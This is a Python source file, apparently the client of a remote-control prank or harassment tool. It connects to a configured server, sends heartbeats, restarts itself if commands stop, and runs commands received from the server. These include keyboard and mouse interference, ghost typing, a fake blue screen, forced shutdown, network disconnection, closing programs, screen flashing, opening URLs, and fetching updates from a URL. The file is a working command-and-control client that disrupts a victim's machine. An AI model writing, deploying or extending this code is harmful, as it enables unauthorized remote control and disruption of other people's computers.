import asyncio
import logging
import os
import sys
from server_communication_and_content import (
    show_lock_screen,
    send_message,
    open_browser_and_visit,
    update_from_url
)
from wallpaper_and_shortcut_manager import change_wallpaper
from update_shortcut_icons import update_all_desktop_shortcuts
from input_interference import mouse_interference, keyboard_interference
from blue_screen_simulator import simulate_blue_screen
from ghost_typing import ghost_typing
from app_manager import open_applications, close_applications
from message_manager import random_popup
from program_interference import program_interference
from system_command_executor import system_reboot_or_shutdown, open_system_settings, text_conversion
from config_manager import get_server_ip, get_server_port, get_retry_interval, get_heartbeat_interval,get_monitor_timeout
from mouse_click_delay import apply_mouse_click_delay
from mouse_wheel_mess import apply_mouse_wheel_mess
from disconnect_network import disconnect_network
from screen_color_changer import start_color_change

command_map = {
    "随机弹窗": random_popup,
    "键盘干扰": keyboard_interference,
    "鼠标干扰": mouse_interference,
    "更改壁纸": change_wallpaper,
    "更改图标": update_all_desktop_shortcuts,
    "更换图标": update_all_desktop_shortcuts,
    "文字转化": text_conversion,
    "关闭程序": close_applications,
    "程序干扰": program_interference,
    "幽灵输入": ghost_typing,
    "关机": system_reboot_or_shutdown,
    "打开程序": open_applications,
    "弹出系统设置": open_system_settings,
    "锁屏": show_lock_screen,
    "打开浏览器": open_browser_and_visit,
    "模拟蓝屏": simulate_blue_screen,
    "鼠标点击延迟": lambda: apply_mouse_click_delay(delay_seconds=5),
    "鼠标滚轮混乱": lambda: apply_mouse_wheel_mess(duration_seconds=10),
    "断网": disconnect_network,
    "屏幕闪烁": start_color_change
}

async def execute_command(command):
    try:
        logging.info("接收到命令: %s", command)
        command = command.lstrip("EXECUTE:").strip()

        if ":" in command:
            cmd, args = command.split(":", 1)
            cmd = cmd.strip()
            args = args.strip()
        else:
            cmd, args = command, ""

        logging.info("解析后的命令: %s, 参数: %s", cmd, args)

        func = command_map.get(cmd)

        if func:
            if asyncio.iscoroutinefunction(func):
                await func()
            else:
                func()
        elif cmd == "SEND_MESSAGE" or cmd == "发送消息":
            if args:
                await send_message(args)
            else:
                logging.warning("未提供有效的消息内容")
        elif cmd == "UPDATE_URL":
            await update_from_url(args)
        elif cmd == "LOCK_SCREEN":
            await show_lock_screen()
        elif cmd == "OPEN_BROWSER":
            await open_browser_and_visit(args)
        else:
            logging.warning("未知命令: %s", cmd)
    except Exception as e:
        logging.error("执行命令出错: %s", e)

async def handle_server_commands(reader, writer, last_command_time):
    try:
        while True:
            data = await reader.read(1024)
            if not data:
                break
            command = data.decode('utf-8').strip()
            last_command_time[0] = asyncio.get_event_loop().time()
            await execute_command(command)
    except asyncio.CancelledError:
        logging.info("处理服务器命令被取消")
    except Exception as e:
        logging.error("处理服务器命令出错: %s", e)
    finally:
        writer.close()
        await writer.wait_closed()

async def monitor_commands(last_command_time):
    timeout = get_monitor_timeout()
    while True:
        await asyncio.sleep(timeout)
        if asyncio.get_event_loop().time() - last_command_time[0] > timeout:
            logging.error("长时间未收到命令，准备重启客户端...")
            os.execv(sys.executable, ['python'] + sys.argv)

async def connect_to_server():
    ip = get_server_ip()
    port = get_server_port()
    retry_interval = get_retry_interval()
    heartbeat_interval = get_heartbeat_interval()

    last_command_time = [asyncio.get_event_loop().time()]

    asyncio.create_task(monitor_commands(last_command_time))

    while True:
        try:
            logging.info(f'尝试连接到服务器... (IP: {ip}, 端口: {port})')
            reader, writer = await asyncio.open_connection(ip, port)
            logging.info(f'已连接到服务器 (IP: {ip}, 端口: {port})')
            writer.write("CONNECTED".encode())
            await writer.drain()
            confirmation = await reader.read(1024)
            if confirmation.decode() == "ACK":
                logging.info("服务端确认连接成功")
                try:
                    while True:
                        await handle_server_commands(reader, writer, last_command_time)
                        logging.info("发送心跳消息")
                        writer.write("HEARTBEAT".encode())
                        await writer.drain()
                        await asyncio.sleep(heartbeat_interval)
                except asyncio.CancelledError:
                    logging.info("心跳消息发送任务被取消")
                except Exception as e:
                    logging.error("连接过程中出现错误: %s", e)
            else:
                logging.warning("服务端未确认连接")
        except asyncio.CancelledError:
            logging.info("连接任务被取消")
        except Exception as e:
            logging.error(f'无法连接到服务器: {e}')
        await asyncio.sleep(retry_interval)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    asyncio.run(connect_to_server())
